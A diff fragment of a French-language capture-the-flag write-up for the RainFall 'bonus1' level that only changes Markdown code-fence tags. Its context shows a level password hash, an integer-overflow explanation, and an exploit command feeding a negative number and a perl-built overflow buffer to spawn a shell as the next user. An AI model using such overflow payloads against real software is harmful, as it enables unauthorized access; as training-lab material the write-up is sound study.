@@ -4,7 +4,7 @@ pass : `cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9`
 
 ## Sources :
 
-```c=
+```c
 #include <stdlib.h>
 #include <string.h>
 
@@ -43,7 +43,7 @@ Du coup `-(2^30 - 1) - 2^30  == 0`
 
 ## Exploit :
 
-```shell=
+```shell
 bonus1@RainFall:~$ ./bonus1 -2147483636 $(perl -e 'print "A"x40 . "\x46\x4c\x4f\x57"')
 $ whoami
 bonus2
